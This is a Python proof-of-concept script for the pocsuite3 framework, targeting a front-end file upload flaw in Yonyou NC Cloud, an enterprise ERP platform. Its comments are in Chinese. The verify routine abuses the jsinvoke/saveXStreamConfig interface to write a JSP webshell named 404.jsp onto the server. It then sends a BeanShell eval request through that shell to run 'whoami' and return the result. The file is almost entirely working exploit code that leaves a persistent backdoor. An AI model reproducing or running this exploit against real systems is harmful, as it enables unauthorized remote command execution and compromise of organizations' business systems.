from collections import OrderedDict
from urllib.parse import urljoin
import re,random,hashlib,base64
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2023-07-21'  #漏洞公开的时间,不知道就写今天
    createDate = '2023-07-21'  # 编写 PoC 的日期
    updateDate = '2023-07-21'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://mp.weixin.qq.com/s/AdbzqcXkZ4GoQUI3J6Qeyw']  # 漏洞地址来源,0day不用写
    name = '用友NC Cloud大型企业数字化平台前台文件上传漏洞'  # PoC 名称
    appPowerLink = 'www.yonyou.com'  # 漏洞厂商主页地址
    appName = '用友NC Cloud大型企业数字化平台'  # 漏洞应用名称
    appVersion = '''ALL'''  # 漏洞影响版本
    vulType = VUL_TYPE.COMMAND_EXECUTION  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        用友NC Cloud大型企业数字化平台，深度应用新一代数字智能技术，完全基于云原生架构，打造开放、互联、融合、智能的一体化云平台，聚焦数智化管理、数智化经营、数智化商业等三大企业数智化转型战略方向，提供涵盖数字营销、财务共享、全球司库、智能制造、敏捷供应链、人才管理、智慧协同等18大解决方案，帮助大型企业全面落地数智化。
        该远程代码执行漏洞可以通过特定接口上传文件，通过上传的webshell执行命令，目前全版本通杀
        1.官方已经发布修复补丁，请进行升级。2.或者进行waf等安全部署拦截恶意字符
    '''
  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    
    def _verify(self):
        result = {}
        
        path='/uapjs/jsinvoke?action=invoke'
        url = self.url + path
        headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        shell_text = '404.jsp'
        data = {"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${param.getClass().forName(param.error).newInstance().eval(param.cmd)}","webapps/nc_web/"+shell_text+""]}

        try:
            resq = requests.post(url=url,json=data,headers=headers,verify=False)
            if resq:
                data = 'cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("whoami").getInputStream())'
                resq_cmd = requests.post(url=self.url+'/'+shell_text+'?error=bsh.Interpreter',data=data,headers=headers,verify=False)
                if resq_cmd.status_code == 200 and "xml version='1.0'" in resq_cmd.text:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['echo'] = resq_cmd.text
        except Exception as e:
            return
        return self.parse_output(result)      

    def _attack(self):
        return self._verify()
    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(POC)